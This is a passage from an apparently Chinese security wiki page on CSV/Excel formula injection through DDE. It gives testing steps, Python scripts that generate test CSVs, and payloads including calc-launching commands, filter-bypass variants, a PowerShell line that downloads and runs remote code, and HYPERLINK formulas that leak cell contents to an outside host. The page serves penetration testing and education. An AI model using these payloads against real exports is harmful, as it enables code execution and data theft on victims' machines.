3ya+/Af3P+wFBW+1fb75PgpuuKaGbRzr1P1HKq15be9XoB28jnKZjKU4SWbo7wji3luL0obqEHLdIZ1gyuQVEAfOXqinDn7gc1vnSlFrHtvqzWYfvBhC33ze7fS2XPD1tr0nns9AO3ks5TJ5qlQgrJTyFM2kw0EbCGXo4JvvyhQLpstgT7Y3msKQHvVsPl+4yK69LJFtL5Km93LF9Gy3io7YXPNFEgqoP/8wmq3ZBFU1vBCzvt+6TMv0Zx5v7UG05X//Df9ePaD1trzniu/rz2gC5TzgXEhl6FMLgDDgYAmIschxwkHvDfYAWivGhbfM3inTruK5m70a7SJ5k6bRVMvu4ouvWwWAO0nUZ3WJRXQ5oagF2gPLvoj3fXLx0Yv9z9GXd0HywDd1eLQt669lU6cOlte520jyvu/vvJ6+Rg35O6h7/zwzvJn3haljaj7SADtZsambOHz6vLXhalPRlzIuVm1X6UjOIM2Qe0PfbPV+wpAe9Ww9r6fls1fSeuXz6KpywPGafb2U3fvSpoKQFtTPU5DSQX0Vdff7o7W8IJu1Wvr3REdPKrDLMtfKhCXQ8x+x06cdkd1OF3xJ/D8Z8vucvvXTvs53TP/8fJn3sbHevWN92jrjtYxNy6379pHy/66msx+5ryCXiWAjhQvYYDO+ICbiADoSMpO5E5NNJfBzACetpK6A0+lieYC0IHq1GNDUgF95XWz3KF0XrDx8LYPd7eNXprb6NNz58uAPnnmMzGgzTE/P/+FO956w/s7yu2bbb9e+LS77XdPryjflOQhgHxD8abb5lHUTLvmgCb/bNctcRhAuxAv3UD0ycSzY+4G+rfpF+/IoP1Uka7buKhU2mAAh9WhAWip1GH28xY9R36L1yapgL7t7kfdcc4GiPzKE1R4zLN3+cY1M2j3Rx1lgHbs73e3HzoiH27X//GQ29b+3o/L7XvPh0eX8PE/bG4jztgZzm++2+S7r9fO+772gOaMmEdu5KlYznCokM9RLpejjAG0N6CQQVeoofDj+vkGyv20LLAOzScOQNfafZWArjxeUgH92ydfdCeheGEW5f2Kv79Bt/zsoXFBMqhdngxz5fdn0bnhC4Ht3b/gCZq34En3XHnSTFBbQeslgI5Ug3YDxqF8LlscYpfJUi7vkBnZgRp0ZY9S/7lYfzZlje7ls+jS+U0BZw1ABwhjdbWBtF+jSQV0a0e3m5HyJJQguFWu56yZb+hFLS9U2ld+fukfb7rTySvXez9zyYUzes6e49S9JYD2i4eo6zirHlu6KFqjBh1VxYnYz73xx6MzPEtgHRqAnggXeY+ZVEAzBBf9fjndePO9xJNQvFD0e8/1Ys5muf575tPPq+7v10blOp7aveCxZaFtcXbNF4X7Hloaul9l2+ZzfQDtUMEMgnaDJ7yGDEB7e5i29+X6c+nEQkdqANAT7b4kA5pn8d1696PuDEGehGKgVvnKmfP9jzzhZrLPLF8VuF+lXbXPM+9a4D77I2y/NW9tdo979Y2zYw3tqwegi6WQ0ogNp0D5bPAY6EjxXLqpmBsFfX9L3CT01yX22pH6s2kirA4NQBuVJuo1yYBmMPIDkOY88Lj7sCKehMLjnHkoHY/W4BuCXHPmDJanefPT7rjUwEPgwqAaZRtPkOFngGxq2hXYFmf2fOOSj3v9j+bQy6vfDtw36Jj1ADTxSA6GsjtCo1iDjhevnHmbdsxr+IxCADqe0gFWo+vPZqfAOnSpHDJ3Y8BYadMAXmumQNIBzWBjWPINO54h6B3BwTDmCS0rV71VHmr36tqNLqQLb8og3d132D1Wz8HBMnRXv77BvRnI5RT+V1VcUuESDL9/4eU19INb7qMzn42vvFIfQNcs/Ko2DEBXlSjqDsVM2a09e28KulO+S/Xo8nrOnD01aswojCqy9f3SAGhv9nn67DnqGzhCLW37A0sKnEEzvCWQ5rHPXLbwTjXn507z86B5lAhn1zyJZU9rpwtwnrn4o1kP0E23zhszftt7/pXvAWjrXQINQgE9CqQN0JWAC/psIP3aW5vKGXDQvn7rF/3uObeuXbmtvbOXnl+5xoV/5fOnh46dJD7eeEZzANB6+hLOBApYVwCADv6XV5xBcybNN/IqQRv0udXpJq518xPsuN4dtJ+t9QC09S6BBqGAHgUA6GBAM0Q5o+WH+UcFKteUZ81ZSPxMjag2kv0AaD19CWcCBawrAECHA1oCz3rYAtDWuwQahAJ6FACgAWg90Tj2TKqO4vjqq6/HWmENFEiAAhzbAHTjAzrJjAoFdHfvAB0ePEpJFiABnMFXiKEAxzTHNsd4PX6K4xi1uRAknVGhgOYB5CwAZxlYoEHSYoBjm2Mc8KwNPOuha9IZFQroegiMYzRu54Dv4DvEQG1jAIC+UFuBEcDQFzGAGIgbAwA0AI2f+IgBxIDSGACglTom7hUXdsjWEAPJiQEAGoBG9oQYQAwojQEAWqljkAUlJwuCL+HLuDEAQAPQyJ4QA4gBpTEAQCt1TNwrLuyQrSEGkhMDADQAjewJMYAYUBoDALRSxyALSk4WBF/Cl3FjQC2g2zp6CEt8Dc4Nf4GsSHDxhX4yqEI/O/opBnQvAC24SJ397DwALQA09JMBBvrZ0U8voDv7AGgBoE+dOQdACwAN/WSAgX529AOgBRDUXII5dhJPaYtb92M76CcDDPSzo59aQLd39iODFlw8ho6dQQYtyKChnwww0M+OfnoB3XUQgBYA+vDQKQBaAGjoJwMM9LOjHwAtgKDmEsfBwycAaAGgoZ8MMNDPjn6KAT2gN4Pet4ambFpIlzStoXVKAd87cFQfoAuzadJFF49ZphdkwSypNQfZqtTPe8FRrqU6/QL04njUHH8TCugNGzYEQqR9/8dqAb1u51N0SdNTNGXTU/TIvvhjlWuZgR/oGwrUNghKNV/vdpIptLh1BMgtS6a4wNbWSVTq5wJ6LU13L3KzabUX2Be+JNZSi47q9POJPTfeW5fS5QF61rw/VPjPezyj34QBmuHcmIBupkeaFtKMPcXXKTubVV5IOroHGwLQwxfaafHki2nSzLWqzlelfkq18oLFvFenXxCgXUiWYnDyUmoJgab5bvV4NfpNCKANnMMBfUgl+Nr2rKBLNq2g5zp6qJhJKy1zdB1SBTw3qH07ib7OwefaplC/4q+NsZlzPYAx3mOo08839kZ+yQ272/WUO4x+dQe0F85hgHYOHFYJ6Oe2LaRLtm0unlupFj1jj74yx0fOwQYBdPEn++VL2lWdrz79dP7SCAK3Ov2qAfpCqXSk5Jec0a+ugK6Ec+MBejPN2MTlDQPkYpmjDGxFNwyb9/WpAp7bkX06yeqZfNNQX1aoTr9SrVTbhSwI0Or084m90eeu65ec0a9ugPaDczigB/Vl0J7yhrnB55Y5SiUPs07D686WHqWAboxRHOr0KwFay03A0XDzlApKNVx1+jUYoI1+dQF0EJxDAd19RBmgA7JlpWWObc0HlAJ69CiOYfPTUtENGoaPOv0aDNDq9IsKaCUlDqNfzQEdBueGArQZ+8zjn/0WZWOit+zsbBBAf0nabtAwoPXpp7NWH5RJq9OvKqB16Wv0qymgq8E5HNBDqjLosFJGcZuuMdHvb3caB9AK66sa9dNar/eDtDr9qgG62vY6D78z+tUM0FHgHA7oTxQBOqC8Ub4pWLx5qGlM9HsftDUOoN3OoWeIEwNHpX6lC5m2MeN+gFanXxiAFSYIRr+aADoqnEMB3aMI0O7NQe/oDTOKY+TVHX6nqMyxvqm1QQCta3iTgY1K/TiLK13MJvnU7DnD1nITUZ1+AYA2M1m1jY4x+lkH9HjgHAbojp6jajJoF77VRmpEgHg9R3es27xXKaDHjuLQ1jkY0ir1K//MLg0JG/NcEz3DFdXpZy5slZr5XOjMRXoiX41+VgE9XjiHA/qYGkDXE6y2jvXmxmZ9gC4DZuywrInsDH7Hhn4yH0E/O/pZBbRfoMdd19ELQEtg/fq7uwBowQUB+skAA/3s6KcY0MeRQZdvQo7UuqNCu/D2DgBaAGjoJwMM9LOjHwAtgGBUWE7EfuggdjpI3F+AabdD/NmJPwAagEam7ZNpAzB2AJP2C1Xc72/iD4AGoAFoANp6DBjAxAVU2u2MfioB7TuV2m96Ndb5Tzv36JL2QI/7/U0HiWufdjvoZ+cXSKats4/M0t7ZT+1dvBwsLQPU3jVA/O+nRpZD1L7/EPHzmovLIDkHeDlCTrdZhsjpHiKn5xN34THNxeUY8eiMjt7joQsAHfC8Dw94o2rEHQULNEAMNGYMZCbiBla1Y0aFD/arDnLCXywFtjb3xbKDUVEB6CeLBKOfekDLvmY6rb0XrnQqIP/WpoPIW0pnC9BP5nejHwAt01GlNQAtd4vpIPKW0tkC9JP53egHQMt0VGkNQMvdYjqIvKV0tgD9ZH43+gHQMh1VWgPQcreYDiJvKZ0tQD+Z341+1gDNT3ybUf5nquOfmuy9cQjAyJwL/WT6sbXpIPKW0tkC9JP53ehnAdDFh9UzFABomVNsWQPQciVNB5G3lM4WoJ/M70Y/AaBL/2XEMzYXgJY5xVg7+RzlHfOp4tUpUC6boUwmQ5lsjgo++wHQFZrF+Gg6SAxTmOAXiDgGTPwJAF3MnItQ9r6XlTe41JFOwDB4s5Rl8GayAYAuUC6ToWyJ3k4hR5lMjgoV4ZBO/SpEEH40HUTYTGrNoZ/M9UY/AaC9IAagZe4oWTsOOU6esgGAdvJZymTzNJI0O5TPjgDbnAMAbZSI/2o6SPwW0m0J/WT+N/oB0DIda2DNWbJfBu0P47HQppT+ArHrCtNB7Laantagn8zXRj8AWqZjDayDAF0sb+Qq6xk+ZQ5k0HK3mA4ibymdLUA/md+NfgC0TMcaWAcA2i19ZAiAroHkPk2aDuKzCasiKAD9IogUsovRD4AOEWliNgHQE6P76KOaDjJ6LT5FVQD6RVXKfz+jHwDtr88Erg0ANKHEUU+nmA5Sz2Mm6VjQT+ZNox8ALdOxBtZBgMZNwhqIHdik6SCBO2BDqALQL1SeqhuNfgB0VanqvUMQoInGjtjwhzZuEsp9ZjqIvKV0tgD9ZH43+gHQMh3tW5dvBo6Mdh45SLHMUZ6o8v8Zh5ioMqKOzXemg9hsM01tQT+Zt41+lgDtnbQif5/ODLAIX3cKtzubMGBGIaZ6yyI/orXpIBF3x24VCkC/CkHG+dHoB0CPU7hG2D2dFzi7njEdxG6r6WkN+sl8bfQDoGU6wjqhCpgOktCvV/OvBf1kEhv9AGiZjuqsvdmzea/uJBvghEwHaYBTVXmK0E/mFqOfekAbyOA12n/w9tNJFirptDYdJJ3fXv6toZ9MQ6Nf5tTZz+nE6c/o2MlPaej4GRo8epoODZ2kgcET1H/oGPUMHKUD/UPU1XuEOroHqW3/IWrtHKAW5yDtaeujXR/10o6WHtrefIC27t5PW3Z00vvbHdq8tZ3e29JG65ta6Z3/fERvb9pLb23cQ2+s301r3tlFhbd3BC5+kMG6+IBmZ2OBBoiBxouBzPCFL0nbAhhXh7GfRnzNDlovu56nz9pkMOn75na+MfST6Wj0UwlovmBwho2/8SsAQI9fMz8L00H8tmFddQWgX3WNwvYw+gHQYSo18Dbj4Ab+ChN66tBPJj/0s6MfAC3TUa01OojMNdAP+skUkFmb+AOgZTqqtTYOVnuCyk8M+skcBP3s6CcCdMuSKTTpootHlplrrd1wRA3ajoNlraTXGoCR+R762dEvNqBdOE9eSi1mFEjrUrqcYW0J0gC0HQfLWkmvNQAj8z30s6NffEAX1o7AuQTpYkY9hRa3yofuAdB2HCxrJb3WAIzM99DPjn6xAe07drowmyZdBEDLXGPHGh1EpiP0g34yBWTWJv4AaJmOaq2Ng9WeoPITg34yB0E/O/pZBfTqmRfTJG9d2tSnY7yixGHHwbJW0msNwMh8D/3s6GcN0GZEx/SCvP6MmYQy57I1OohMQ+gH/WQKyKxN/FkAdDstnlwcamcLzgC0zLlsbRwsbymdLUA/md+hnx39hIBeS9PdcdB2bgx6bzyixGHHwbJW0msNwMh8D/3s6Bcf0Gbcs6WasxfOyKBlzmVrdBCZhtAP+skUkFmb+IsNaJs3BCvhDEDLnMvWxsHyltLZAvST+R362dEvJqCLpY3Ll7Rbm9pdCWmUOOw4WNZKeq0BGJnvoZ8d/USAHvUcDsvP5ACg7ThY1kp6rQEYme+hnx39YgLazlC6yqzZ+xmAtuNgWSvptQZgZL6Hfnb0A6BlOqq1RgeRuQb6QT+ZAjJrE38AtExHtdbGwWpPUPmJQT+Zg6CfHf0AaJmOaq3RQWSugX7QT6aAzNrEHwAt01GttXGw2hNUfmLQT+Yg6GdHv/8BGhYx3T929SgAAAAASUVORK5CYII=" alt="image" loading="lazy">​</p><ul><li>针对二进制流是开头是 <code>Tab (0x09)</code>​、<code>Enter (0x0D)</code>​ 也有可能造成注入。</li><li>使用 python 创建一个 csv：<code>py .\csv_test.py</code>​</li></ul><div class="language-python line-numbers-mode" data-ext="py" data-title="py"><pre class="language-python"><code><span class="token keyword">import</span> csv

<span class="token comment"># 定义数据</span>
data <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token punctuation">{</span><span class="token string">&quot;name&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;=&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;age&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;=1+1&quot;</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span><span class="token string">&quot;name&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;-&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;age&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;-2+3&quot;</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span><span class="token string">&quot;name&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;@&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;age&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;@2+3&quot;</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span><span class="token string">&quot;name&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;+&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;age&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;+2+3&quot;</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span>

<span class="token comment"># 定义 CSV 文件路径</span>
csv_file <span class="token operator">=</span> <span class="token string">&quot;data.csv&quot;</span>

<span class="token comment"># 写入 CSV 文件</span>
<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>csv_file<span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">&#39;w&#39;</span><span class="token punctuation">,</span> newline<span class="token operator">=</span><span class="token string">&#39;&#39;</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
    writer <span class="token operator">=</span> csv<span class="token punctuation">.</span>DictWriter<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> fieldnames<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">&quot;name&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;age&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    <span class="token comment"># 写入标题</span>
    writer<span class="token punctuation">.</span>writeheader<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token comment"># 写入数据</span>
    <span class="token keyword">for</span> row <span class="token keyword">in</span> data<span class="token punctuation">:</span>
        writer<span class="token punctuation">.</span>writerow<span class="token punctuation">(</span>row<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;CSV 文件已创建成功！&quot;</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240407134804-c7w6sg0.4c86fb32.png" alt="image" loading="lazy">​</p><h2 id="dde" tabindex="-1"><a class="header-anchor" href="#dde"><span>DDE</span></a></h2><p>动态数据交换（DDE），是 Windows 下进程间通信协议，支持 Microsoft Excel，LibreOffice 和 Apache OpenOffice。Excel、Word、Rtf、Outlook 都可以使用这种机制，<strong>根据外部应用的处理结果来更新内容</strong>。因此，如果我们制作包含 DDE 公式的 CSV 文件，那么在打开该文件时，Excel 就会尝试执行外部应用。</p><h1 id="漏洞挖掘" tabindex="-1"><a class="header-anchor" href="#漏洞挖掘"><span>漏洞挖掘</span></a></h1><h2 id="安全测试" tabindex="-1"><a class="header-anchor" href="#安全测试"><span>安全测试</span></a></h2><ol><li><p>查找、留意系统中是否有到导出为 csv 或 xls 格式的利用点。一般存在于信息统计，或者日志导出等地方。</p></li><li><p>确定导出的内容可控</p><ol><li>可以在界面可直接进行编辑/新增</li><li>通过数据篡改/HPP/追踪数据源等方式看是否可以控制输入</li></ol></li><li><p>如果存在注入点且有过滤，尝试绕过，最后进行 OS 执行等深入利用</p></li><li><p>其他常见 csv 注入输入场景有：</p><ol><li>burpsuite 抓取登录报文，修改<strong>用户名</strong>为&quot;<code>=cmd|&#39;/c ping 127.0.0.1 -t&#39;!A1</code>​&quot;，查看导出的安全日志中是否会执行构造的命令</li><li>操作失败日志记录场景(比如上传文件场景，将<strong>文件名</strong>修改为&quot;<code>=cmd|&#39;/c ping 127.0.0.1 -t&#39;!A1</code>​&quot;）<strong>以及其他可被用户控制的入参操作场景</strong>，且这些用户的控制入参可被记录到可导出日志中，查看导出的安全日志中是否会执行构造的命令</li></ol></li><li><p>建议构造如下数据</p></li></ol><div class="language-python line-numbers-mode" data-ext="py" data-title="py"><pre class="language-python"><code><span class="token operator">=</span>cmd<span class="token operator">|</span><span class="token string">&#39;/c calc&#39;</span>!<span class="token string">&#39;A1&#39;</span>
\&quot;<span class="token punctuation">,</span><span class="token operator">=</span>cmd<span class="token operator">|</span><span class="token string">&#39;/c calc&#39;</span>!<span class="token string">&#39;A1&#39;</span>
&quot;<span class="token punctuation">,</span><span class="token operator">=</span>cmd<span class="token operator">|</span><span class="token string">&#39;/c calc&#39;</span>!<span class="token string">&#39;A1&#39;</span>
xxx，<span class="token operator">=</span>cmd<span class="token operator">|</span><span class="token string">&#39;/c calc&#39;</span>!<span class="token string">&#39;A1&#39;</span>
xxx\n<span class="token operator">=</span>cmd<span class="token operator">|</span><span class="token string">&#39;/c calc&#39;</span>!<span class="token string">&#39;A1&#39;</span>

<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
在 csv 文件 和 xlsx 文件中的每一项的值如果是 <span class="token operator">=</span><span class="token punctuation">,</span> @<span class="token punctuation">,</span> <span class="token operator">+</span><span class="token punctuation">,</span> <span class="token operator">-</span> 就会被 excel 识别为一个公式， 此时可以注入系统命令实现命令执行。

<span class="token comment"># 常用 payload</span>
<span class="token operator">=</span>cmd<span class="token operator">|</span><span class="token string">&#39;/c calc&#39;</span>!A0    <span class="token comment"># 弹计算器</span>

<span class="token operator">=</span>MSEXCEL<span class="token operator">|</span><span class="token string">&#39;\..\..\..\Windows\System32\cmd.exe /c calc.exe&#39;</span>!<span class="token string">&#39;&#39;</span> <span class="token comment"># 弹计算器</span>

<span class="token operator">=</span>HYPERLINK<span class="token punctuation">(</span><span class="token string">&quot;http://vps_ip?test=&quot;</span><span class="token operator">&amp;</span>A2<span class="token operator">&amp;</span>A3<span class="token punctuation">,</span><span class="token string">&quot;Error: Please click me!&quot;</span><span class="token punctuation">)</span>  <span class="token comment"># 发起 http请求获取数据</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol start="6"><li>覆盖产品中所有存在导出 <code>CSV/Excel</code>​ 等格式的场景。</li></ol><h2 id="bypass" tabindex="-1"><a class="header-anchor" href="#bypass"><span>Bypass</span></a></h2><ul><li><p>在<strong>等于号</strong>被过滤的情况，可以通过运算符 <code>+-</code>​​ 的方式绕过</p><p>​<code>-1+1+cmd |&#39; /C calc&#39;!A0</code>​​</p></li><li><p>参数处输入一下 payload，由于 <code>%0A</code>​​ 被解析，从而后面的数据跳转的下一行</p><p>​<code>%0A-1+1+cmd |&#39; /C calc&#39;!A0</code>​​</p></li><li><p>导出文件为 CSV 时，若系统在等号 <code>=</code>​​ 前加了引号 <code>&#39;</code>​​ 过滤，则可以使用分号绕过，分号（<code>;</code>​​）可以分离前后两部分内容使其分别执行【此技巧和上面的换行本质是一样的，相当于在新的单元格里面写入内容】</p><p>​<code>;-3+3+cmd|&#39;/C calc&#39;!D2</code>​​</p></li><li><p>其他</p><p>​<code>@SUM(cmd|&#39;/c calc&#39;!A0)</code></p><p>​<code>@SUM(1+1)*cmd|&#39; /C calc&#39;!A0</code>​</p><p>​<code>@SUM(1+1)*cmd|&#39; /C powershell IEX(wget 0r.pe/p)&#39;!A0</code>​</p></li></ul><h1 id="注意事项" tabindex="-1"><a class="header-anchor" href="#注意事项"><span>注意事项</span></a></h1><h2 id="excel" tabindex="-1"><a class="header-anchor" href="#excel"><span>Excel</span></a></h2><p>执行外部命令需要用到 Excel 的 DDE（Dynamic Data Exchange，动态数据交换），在新版本的 Excel 中（我的为 Excel 2016）需要修改设置才能复现：</p><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>文件 &gt; 选项 &gt; 信任中心 &gt; 信任中心设置 &gt; 外部内容

在“动态数据交换的安全设置”中勾选“启用动态数据交换服务器查找”和“启用动态数据交换服务器启动”。
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240314135027-g5hayvd.a188f85b.png" alt="image" loading="lazy">​</p><p>虽然微软默认关闭了 DDE 让执行外部命令有一些难度，但并不表示这个漏洞就无用武之地，毕竟公式是可以改变数据最终呈现的，比如上文提到的 HYPERLINK 能用来钓鱼、泄露信息，或者涉及金额计算的地方用来修改金额等。</p><p>这类漏洞通常出现在涉及导出数据的地方，比如<strong>导出日志</strong>、<strong>统计信息</strong>、<strong>配置信息</strong>等等位置。</p><h2 id="wps" tabindex="-1"><a class="header-anchor" href="#wps"><span>WPS</span></a></h2><ol><li><p>打开 WPS 公式编辑器，并选择要链接的单元格。</p></li><li><p>在公式编辑栏中输入“=”符号，然后输入“DDE(&quot;程序名称”，“服 务器名称”，“数据项””。</p><ol><li>程序名称：指的是链接的数据源程序名称，例如 Excel。</li><li>服务器名称：指的是数据源程序的文件名和路径。</li><li>数据项：指的是要链接的数据项，可以是单元格的数值、字符，或者其他数据类型。</li></ol></li><li><p>例如，<code>&quot;DDE(Excel，C:\data.xlsx，Sheetl!A1)&quot;</code>​ 表示链接 Excel 文 件中 Sheet1 工作表的 A1 单元格数据。</p></li><li><p>按下回车键，完成动态链接。</p></li></ol><h1 id="漏洞危害" tabindex="-1"><a class="header-anchor" href="#漏洞危害"><span>漏洞危害</span></a></h1><h2 id="泄露敏感信息" tabindex="-1"><a class="header-anchor" href="#泄露敏感信息"><span>泄露敏感信息</span></a></h2><p><a href="https://support.microsoft.com/zh-cn/office/hyperlink-%E5%87%BD%E6%95%B0-333c7ce6-c5ae-4164-9c47-7de9b76f577f" target="_blank" rel="noopener noreferrer">HYPERLINK 函数 - Microsoft 支持<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p><p>语法：<code>HYPERLINK(link_location, [friendly_name])</code>​</p><p>​<code>link_location</code>​ 的各种形式可以参看上面的官方示例。</p><p>其中很大的一方面是由于信任域的原因导致用户仍可能受到攻击，用户在 security.com 域下导出自己的 Guestbook.csv ，但由于恶意用户偷偷的在留言板中插入了恶意代码：</p><div class="language-c line-numbers-mode" data-ext="c" data-title="c"><pre class="language-c"><code><span class="token operator">=</span><span class="token function">HYPERLINK</span><span class="token punctuation">(</span><span class="token string">&quot;http://linux.im?test=&quot;</span><span class="token operator">&amp;</span>A2<span class="token operator">&amp;</span>A3<span class="token punctuation">,</span><span class="token string">&quot;Error: Please click me!&quot;</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>这样就导致当用户在导出报表后倘若点击了某个单元格则会导致 A2,A3 的单元格内容泄露。</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240327104514-mbmpdmj.4543eaa7.png" alt="image" loading="lazy">​</p><p><strong>【实操】</strong></p><p>这样当用户在导出报表后，若点击这个单元格则会导致 A1 单元格的内容泄露。</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240407142709-lxrfk0l.2b62bd3a.png" alt="image" loading="lazy">​</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240407142848-2lcyw5q.785f0da6.png" alt="image" loading="lazy">​</p><p>‍</p><hr><p><strong>【关于 python csv 库的问题】</strong></p><div class="language-python line-numbers-mode" data-ext="py" data-title="py"><pre class="language-python"><code><span class="token keyword">import</span> csv

<span class="token comment"># 定义数据</span>
data <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token punctuation">{</span><span class="token string">&quot;name&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;=&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;age&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;=1+1&quot;</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span><span class="token string">&quot;name&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;-&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;age&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;-2+3&quot;</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span><span class="token string">&quot;name&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;@&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;age&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;@2+3&quot;</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span><span class="token string">&quot;name&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;+&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;age&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;+2+3&quot;</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span><span class="token string">&quot;name&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;hyperlink&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;age&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;=HYPERLINK(\&quot;http://www.baidu.com/\&quot;&amp;A1,\&quot;click\&quot;)&quot;</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span>

<span class="token comment"># 定义 CSV 文件路径</span>
csv_file <span class="token operator">=</span> <span class="token string">&quot;data_hyperlink.csv&quot;</span>

<span class="token comment"># 写入 CSV 文件</span>
<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>csv_file<span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">&#39;w&#39;</span><span class="token punctuation">,</span> newline<span class="token operator">=</span><span class="token string">&#39;&#39;</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
    writer <span class="token operator">=</span> csv<span class="token punctuation">.</span>DictWriter<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> fieldnames<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">&quot;name&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;age&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    <span class="token comment"># 写入标题</span>
    writer<span class="token punctuation">.</span>writeheader<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token comment"># 写入数据</span>
    <span class="token keyword">for</span> row <span class="token keyword">in</span> data<span class="token punctuation">:</span>
        writer<span class="token punctuation">.</span>writerow<span class="token punctuation">(</span>row<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;CSV 文件已创建成功！&quot;</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240407143214-kfe8a00.c1685feb.png" alt="image" loading="lazy">​</p><p>Excel 解析时会将两个双引号转义为单个双引号。</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240407144127-4cgm2yz.49bf0dd0.png" alt="image" 